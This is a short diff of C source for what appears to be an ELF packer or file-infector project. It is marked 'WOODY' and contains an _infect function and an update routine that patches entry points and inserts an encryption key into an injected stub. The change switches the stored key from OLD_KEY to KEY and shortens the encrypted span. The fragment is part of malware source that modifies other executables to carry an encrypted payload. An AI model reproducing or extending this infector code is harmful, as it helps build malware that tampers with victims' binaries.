@@ -4,7 +4,6 @@
 #include <stdio.h>
 
 char KEY[16];
-char OLD_KEY[16];
 int DATA = 0x02;
 
 //======================= WOODY ==============================
@@ -69,9 +68,9 @@ void update(char *b, size_t n, size_t old_entry, size_t entry){
 	//p[3]=ok;
 	//p[4] = text_length;
 	//inserting KEY
-	p[5] = ((size_t*)OLD_KEY)[0];
-	p[6] = ((size_t*)OLD_KEY)[1];
-	encrypt((char*)(p+7), 15, (uint32_t*)KEY);
+	p[5] = ((size_t*)KEY)[0];
+	p[6] = ((size_t*)KEY)[1];
+	encrypt((char*)(p+7), 8, (uint32_t*)KEY);
 }
 
 static int _infect(char **s, size_t *n, char *b, size_t bn){
